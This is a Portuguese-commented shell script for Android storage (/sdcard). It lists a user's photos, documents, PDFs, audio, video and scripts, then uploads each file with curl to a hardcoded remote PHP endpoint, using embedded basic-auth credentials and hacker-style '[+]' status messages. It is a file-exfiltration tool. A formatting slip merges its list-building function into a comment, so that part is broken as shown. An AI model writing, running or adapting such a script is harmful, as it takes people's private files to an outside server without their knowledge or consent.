#!/bin/sh

# Cores para formatação de texto
cor_verde='\033[0;32m'
sem_cor='\033[0m'

# Diretório inicial para a busca
diretorio_inicial="/sdcard"

# Nome do arquivo para armazenar a lista
arquivo_lista="$diretorio_inicial/arquivos.list.txt"

# URL do servidor PHP que recebe os arquivos
url_servidor="http://192.168.100.11:7777/upload.php"

# Nome de usuário e senha para autenticação básica
usuario="Mik"
senha="pass123"                                                   
# Função para buscar e armazenar a lista de arquivos por extensão buscar_e_armazenar_lista() {
  extensoes=("sh" "png" "jpeg" "jpg" "txt" "pptx" "pdf" "mp4" "mp3")                                                                
  # Itera sobre cada extensão e busca os arquivos
  for extensao in "${extensoes[@]}"; do
    find -name "*.$extensao" >> "$arquivo_lista"
  done
}

# Função para enviar arquivos da lista
enviar_arquivos_da_lista() {
  tipo_arquivo="$1"

  # Lê cada linha do arquivo e envia os arquivos um por um
  while IFS= read -r arquivo; do
    # Nome do arquivo sem o caminho
    nome_arquivo=$(basename "$arquivo")

    # Exibe mensagem de status antes de enviar o arquivo (formatado em verde)
    echo -e "${cor_verde}[+] Mik - Enviando $tipo_arquivo: $nome_arquivo para o servidor.${sem_cor}"

    # Usa o curl para enviar o arquivo para o servidor com autenticação básica
    curl -u "$usuario:$senha" -F "arquivo=@$arquivo" "$url_servidor"

    # Exibe mensagem de status após o envio do arquivo (formatado em verde)
    echo -e "${cor_verde}[+] Mik - Enviado $tipo_arquivo: $nome_arquivo para o servidor.${sem_cor}"
  done < "$arquivo_lista"
}

# Exibe mensagem de status inicial (formatado em verde)
echo -e "${cor_verde}[+] Mik - Iniciando a busca e armazenamento da lista de arquivos.${sem_cor}"

# Chama a função para buscar e armazenar a lista de arquivos
echo -e "${cor_verde}[+] Mik - Buscando e armazenando a lista de arquivos.${sem_cor}"
buscar_e_armazenar_lista

# Exibe mensagem de status após armazenamento da lista (formatado em verde)
echo -e "${cor_verde}[+] Mik - Lista de arquivos armazenada.${sem_cor}"

# Exibe mensagem de status inicial (formatado em verde)
echo -e "${cor_verde}[+] Mik - Iniciando o envio de arquivos.${sem_cor}"

# Chama a função para enviar arquivos da lista
echo -e "${cor_verde}[+] Mik - Enviando arquivos.${sem_cor}"
enviar_arquivos_da_lista "arquivo"

# Exibe mensagem de status final (formatado em verde)
echo -e "${cor_verde}[+] Mik - Envio de arquivos concluído.${sem_cor}"
